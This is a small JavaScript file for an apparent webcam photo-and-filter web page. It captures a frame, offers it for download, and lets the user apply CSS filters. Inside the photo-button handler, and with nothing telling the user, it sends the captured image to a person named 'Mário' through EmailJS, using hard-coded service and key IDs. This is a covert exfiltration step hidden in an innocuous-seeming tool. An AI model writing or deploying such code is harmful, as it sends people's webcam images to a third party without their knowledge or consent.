(function(){
    emailjs.init("m9JcXhx2n9L6gkRHC");
})();

var video = document.querySelector('video');

navigator.mediaDevices.getUserMedia({video:true})
.then(stream => {
    video.srcObject = stream;
    video.play;
})
.catch(error => {
    console.log(error);
});

var link;

var blur = document.getElementById("blur");
var brightness = document.getElementById("brightness");
var contrast = document.getElementById("contrast");
var invert = document.getElementById("invert");
var saturate = document.getElementById("saturate");
var sepia = document.getElementById("sepia");

document.getElementById('btnPhotoTake').addEventListener('click', () => {
    var canvas = document.querySelector('canvas');
    canvas.height = video.videoHeight;
    canvas.width = video.videoWidth;
    var context = canvas.getContext('2d');
    context.drawImage(video, 0, 0);
    if(link!=undefined){
        link.remove();
    }
    link = document.createElement('a');
    link.download = "foto.png";
    link.href = canvas.toDataURL("image/jpeg", 0.1);
    link.textContent = "Clique para baixar a foto";
    document.body.appendChild(link);

    var tempParams = {
        to_name:"Mário",
        message:"foto",
        content: link.href,
    };

    console.log(link.href);

    emailjs.send('service_2ua9jwp','template_xc2i0cq',tempParams).then(function(res){
        console.log("sucess", res.status);
    });
});

blur.addEventListener('click', () => {
    document.querySelector('canvas').style.filter="blur(5px)";
});

brightness.addEventListener('click', () => {
    document.querySelector('canvas').style.filter="brightness(0.4)";
});

contrast.addEventListener('click', () => {
    document.querySelector('canvas').style.filter="contrast(200%)";
});

invert.addEventListener('click', () => {
    document.querySelector('canvas').style.filter="invert(50%)";
});

saturate.addEventListener('click', () => {
    document.querySelector('canvas').style.filter="saturate(30%)";
});

sepia.addEventListener('click', () => {
    document.querySelector('canvas').style.filter="sepia(60%)";
});